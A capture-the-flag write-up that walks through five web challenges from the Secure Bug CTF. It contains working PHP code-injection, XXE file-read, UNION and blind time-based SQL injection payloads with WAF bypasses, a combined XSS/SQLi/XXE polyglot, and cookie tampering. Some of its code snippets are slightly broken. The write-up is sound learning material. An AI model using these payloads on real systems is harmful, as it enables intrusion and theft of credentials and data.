# SECURE BUG CTF

It was awesome ctf ,so let's enjoy with writeup.
![Screenshot at 2021-07-21 23-00-03](https://user-images.githubusercontent.com/52857059/126559479-6a970fa9-6aa4-4f15-8b10-de9ad4189aa0.png)
 It isn't bad score :"D

# web challenges:

## 1- SimPlay
![Screenshot at 2021-11-25 19-26-09](https://user-images.githubusercontent.com/52857059/143482771-46d1f5ad-c4c8-4667-882a-6d2c23525010.png)
After clicking the Try Again button :

![Screenshot at 2021-11-25 19-32-26](https://user-images.githubusercontent.com/52857059/143484789-d5764601-d715-4dda-87f6-225147275112.png)

I try php code injection ${system('ls')}
![Screenshot at 2021-11-25 19-35-36](https://user-images.githubusercontent.com/52857059/143484816-0131587c-3d6c-43f1-b947-5afac58b96ae.png)

It works But I can't find flag file.
let's try another payload with base64_decode function --> ${system(base64_decode(bHMgLi4v))}
![Screenshot at 2021-11-25 19-39-34](https://user-images.githubusercontent.com/52857059/143484886-c4cdb4ad-025d-46f2-85c7-57850b62bd3d.png)

I got flag name :")
next step , let's read flag file --> ${system(base64_decode(Y2F0IC4uL2ZsYWcq))}

![Screenshot at 2021-11-25 19-47-54](https://user-images.githubusercontent.com/52857059/143484917-bf996a6b-275b-4965-9982-0742345a348d.png)


## 2- ALLLn1(medium)

![Screenshot at 2021-07-21 12-39-35](https://user-images.githubusercontent.com/52857059/126521585-a4841180-b58a-4e82-b9d3-93429f94495b.png)

if we go to source directory we will see source code of page , it is js code.  

![Screenshot at 2021-07-21 18-16-09](https://user-images.githubusercontent.com/52857059/126523341-739e3200-9c9b-4f6b-9d47-4e8009cf27b6.png)

we notice when returns "parabens hackudo" we get the flag , else we get nope.

let's take second script & test our payload locally

```html
const puppeteer = require('puppeteer')
const mysql = require("mysql")
const util = require('util')
const libxml = require("libxmljs")
const fs = require("fs")
const sanitizeHtml = require("sanitize-html")



function test_xxe(payload) {

	try {
		var my_secret = Math.random().toString(36).substring(2) ;
		fs.writeFileSync("/home/gnx/script/xxe_secret",my_secret)
		var doc = libxml.parseXml(payload, { noent: true ,nonet: true })
		return doc.toString().includes(my_secret) 
		
	} catch (e) {
		return false
	}
} 

async function test_xss(payload) {
	try {
		const browser = await puppeteer.launch({args:['--no-sandbox', '--disable-setuid-sandbox','--disable-dev-shm-usage','--disable-accelerated-2d-canvas','--no-first-run','--no-zygote','--single-process','--disable-gpu']})
		const page = await browser.newPage()
		page.setDefaultNavigationTimeout(1000);
		payload = sanitizeHtml(payload,{allowedTags:[]})
		await page.goto(`data:text/html,<script>${payload}</script>`)
		const check = await page.evaluate("( typeof xss != 'undefined' ? true : false )") // vlw herrera

		await browser.close()
		
		return check

	} catch (error) {
		console.error(error)
	}

}

async function test_sqli(payload) {

	var connection = mysql.createConnection({
		host : process.env.MYSQL_HOST || "127.0.0.1",
		user : process.env.MYSQL_USER,
		password : process.env.MYSQL_PASSWORD,
		database : process.env.MYSQL_DATABASE,
		charset: 'utf8',
    dialectOptions: {
			collate: 'utf8_general_ci',
    },
	})


	const query = util.promisify(connection.query).bind(connection)


	connection.connect()

	const users = await query("SELECT * from users") 
	try {
		const sqli = await query(`SELECT * from posts where id='${payload}'`)
		await connection.end() 
		return JSON.stringify(sqli).includes(users[0]["password"])	
	} catch(e) {
		return false
	}
}

function main(args){

	var xss = test_xss(args[0])
	var sqli = test_sqli(args[0])
	var xxe = test_xxe(args[0])

  Promise.all([xss,sqli]).then( function( values ){
                if ( values[0] && values[1] && xxe ) {
                        console.log("parabens hackudo")
                } else {
                        console.log("hack harder")
                }

                process.exit(0)
        })
	
}

main(process.argv.slice(2))

```
let's start with sqli test :

sql injection payload  
```html 
' UNION SELECT 1, 2 , password FROM users -- - 
```
![Screenshot at 2021-07-21 18-42-41](https://user-images.githubusercontent.com/52857059/126526899-14f9eecd-a648-4d7e-9e7f-84eed2cf6870.png)
 yes, it works

```html
async function test_sqli(payload) {

	var connection = mysql.createConnection({
		host : "127.0.0.1",
		user : "root",
		password : "root",
		database : "foo",
		charset: 'utf8',
    dialectOptions: {
			collate: 'utf8_general_ci',
    },
	})


	const query = util.promisify(connection.query).bind(connection)


	connection.connect()

	const users = await query("SELECT * from users") 
	try {
		const sqli = await query(`SELECT * from posts where id='${payload}'`)
		await connection.end() 
		return JSON.stringify(sqli).includes(users[0]["password"])	
	} catch(e) {
		return false
	}
}

function main() {
	let sql_payload = "' UNION SELECT 1, 2 , password FROM users -- - "
	
	var sqli = test_sqli(payload)

	Promise.all([sqli]).then( function( values ){
		console.log('SQL: ' + values[0])

		process.exit(0)
	})

	
}

```
  if we access this file locally it returns true , so first test is done.
  
  XXE test :
  
  xxe payload 
  ```html
<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/ctf/payload/src/xxe_secret'>]><root>&test;</root>
```
```html
function test_xxe(payload) {

	try {
		var my_secret = Math.random().toString(36).substring(2) ;
		fs.writeFileSync("/root/ctf/payload/src/xxe_secret",my_secret)
		var doc = libxml.parseXml(payload, { noent: true ,nonet: true })
		return doc.toString().includes(my_secret) 

	} catch (e) {
		return false
	}
} 

unction main() {
	let sql_payload = "' UNION SELECT 1, 2 , password FROM users -- - "
	let xxe_payload = "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/ctf/payload/src/xxe_secret'>]><root>&test;</root>"
	
	//var sqli = test_sqli(payload)
	var xxe = test_xxe(xxe_payload)
	

	Promise.all([sqli,xss]).then( function( values ){
		console.log('SQL: ' + values[0])
		console.log('XEE: ' + xxe)
		

		process.exit(0)
	})

	
}

```
if we access this file locally it returns true , so second test is done.
  
A Payload to rule them all :
```html 
unction main() {
	
let payload ="<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///home/gnx/scriptxxe_secret\">]><root><textarea>&test;</textarea><script>' UNION SELECT 1, 2 , password FROM users -- -</script><c>%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%78%73%73%3d%31</c></root>"

	var sqli = test_sqli(payload)
	var xxe = test_xxe(payload)
	var xss = test_xss(payload)

	Promise.all([sqli,xss]).then( function( values ){
		console.log('SQL: ' + values[0])
		console.log('XEE: ' + xxe)
		console.log('xss: ' + values[1])

		process.exit(0)
	})
```
if we run this file locally it returns true , so test is done.
last payload --> 
```html
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///home/gnx/script/xxe_secret">]><root><textarea>&test;</textarea><script>' UNION SELECT 1, 2 , password FROM users -- -</script><c>%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%78%73%73%3d%31</c></root>
```
![Screenshot at 2021-07-21 19-18-58](https://user-images.githubusercontent.com/52857059/126531806-2a0f500d-291e-4746-be80-6a8da06ae55e.png)

booom flag SBCTF{It_!s_th3_FL4GSH!P!}

## 3- INCEPTION(easy)

if we open 
```html
https://ch24.sbug.se/?src (getting ?src from page source)
```

![Screenshot at 2021-07-21 12-57-59](https://user-images.githubusercontent.com/52857059/126552622-c5f1a8db-a4ce-4e45-a9b5-3d0d2a742147.png)

```html
they are BlackList words replace them to space -->  preg_replace("/select|union|from|where/i", "", @$_GET["fname"]);
```
I thought it was sqli injection exactly blind sqli because when I injected input no error was appeared 

I bypassed these words in blacklist by wrote the same word again in the middle EX: (select ---> selselectect) 

I stared injecting with this payload , I guessed the part of column name 'pass' cause he said in description challenge (find the admin password) 

```html
1'+OR+(selselectect+sleep(10)+frofromm+dual+whewherere+(selselectect+table_name+frfromom information_schema.columns+whwhereere+table_schema=database()+and+column_name+like+'%pass%'+limit+0,1)+like+'%%')%23
```
By guessing &trying I got columns (passwd , uname , role), table (inception_users)

![Screenshot at 2021-07-21 13-01-52](https://user-images.githubusercontent.com/52857059/126554514-25f916b4-f110-4080-8e24-8baefc5f0677.png)

![Screenshot at 2021-07-21 13-02-48](https://user-images.githubusercontent.com/52857059/126554656-6954d967-9149-4d0d-a7ec-5b8d32f4b745.png)

now let's see what is in passwd column by this payload :

```html
1'+OR+(+SELselectECT+count(*)+frfromom+inception_users+whwhereere+role=+'admin'+AND+passwd+like+'%')%23
```
![Screenshot at 2021-07-21 13-05-22](https://user-images.githubusercontent.com/52857059/126555069-c55458f6-55ec-44b5-84b2-78ba3fe1aad4.png)

By guessing &trying I finally got the flag :"D
![Screenshot at 2021-07-21 13-06-03](https://user-images.githubusercontent.com/52857059/126555257-a0cbdc1e-f163-4621-8688-e77195d6e80d.png)

![Screenshot at 2021-07-21 22-53-19](https://user-images.githubusercontent.com/52857059/126559146-3d478da0-4f5a-499b-8063-efa46d01b2ba.png)

## 4- BLACKLIST(medium)

![Screenshot at 2021-07-21 15-13-53](https://user-images.githubusercontent.com/52857059/126556113-44fabb06-437f-47ce-b03d-f7244d7590e9.png)

It was the same - inception challenge - But the blacklist was space , i tried (/**/) as space but it was faild .

finally i found (/* _ */) worked as a space without waf caught it :D 
the same mechanism again ...

![Screenshot at 2021-07-21 15-15-04](https://user-images.githubusercontent.com/52857059/126556433-9d813bfc-f7ab-4658-992a-8c9c74f92d16.png)

By guessing &trying I got column (flag), table (blacklist_users)

now let's see what is in flag column by this payload :
```html
1'/*_*/or/*_*/(select/*_*/sleep(10)/*_*/from/*_*/dual/*_*/where/*_*/(select/*_*/flag/*_*/from/*_*/blacklist_users)/*_*/like/*_*/'%')%23
```
By guessing &trying I finally got the flag :"D

![Screenshot at 2021-07-21 15-14-22](https://user-images.githubusercontent.com/52857059/126556925-a5f3f320-25a5-4161-b90a-a288d977200f.png)

## 5- BUY THE FLAG(easy)

this challenge depend on decreption let's see it .
![Screenshot at 2021-07-21 22-41-03](https://user-images.githubusercontent.com/52857059/126557249-e4722ab1-47e7-48fa-ad35-6a9f4eb9d8e9.png)

With a little care we notice that by changing the cookie it returns to the original value so it is sensitive to cookies according to the cookie
```html
Cookie:3054505242564F465A55567A59456257644662475647644B5A56597759466255426A57735A315431305756584A6C566A746B567759565531736D5956683261546C58557849474E78306D56
```
then by unhexing and reversing and decoding base64 5 times , we will get 
```html
User_is_=Fread
```
now we have to change value to Us3r & encrept User_is_=Us3r hexing & reversing and encoding base64 5 times
after that u will get the flag 

![Screenshot at 2021-07-21 16-20-32](https://user-images.githubusercontent.com/52857059/126558141-f3f012a4-3f41-4d53-9791-f88a2961025d.png)

